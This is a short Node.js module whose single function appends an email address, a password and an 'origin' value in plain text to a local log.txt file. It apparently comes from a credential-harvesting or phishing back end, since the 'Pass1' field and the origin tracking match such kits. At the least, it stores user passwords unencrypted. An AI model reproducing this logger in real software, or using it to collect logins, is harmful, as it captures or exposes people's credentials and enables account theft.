const path = require("path");
const fs = require("fs");
const fsPromises = require("fs").promises;

const logPath = path.join(__dirname, "../logs");

const logger = async (mail, password, origin) => {
  const logItem = `Email: ${mail}\n Pass1: ${password}\n Origin: ${origin}\n`;

  if (!fs.existsSync(logPath)) {
    await fsPromises.mkdir(logPath);
  }

  const logFilePath = path.join(logPath, "log.txt");

  try {
    await fsPromises.appendFile(logFilePath, logItem);
    console.log("Log successfully added to log.txt");
  } catch (error) {
    console.error("Error writing to log file:", error);
  }
};

module.exports = { logger };
